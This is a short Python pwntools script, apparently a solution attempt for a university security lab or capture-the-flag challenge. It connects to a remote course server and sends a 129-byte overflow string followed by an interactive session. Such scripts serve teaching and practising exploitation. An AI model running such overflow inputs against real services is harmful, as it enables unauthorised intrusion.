from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 25151

### run a remote process
s = remote(SERVER, PORT, timeout=9999)

### run a local process
# s = process('./program/simple', shell=True)

### interact with it

# s.recvall()
# s.recvuntil(b'Message : ')
# s.recvline()

input('')

# s.send(129 * b'a' + b'\n')
s.sendline(129 * b'a' + b'\n')

s.interactive()
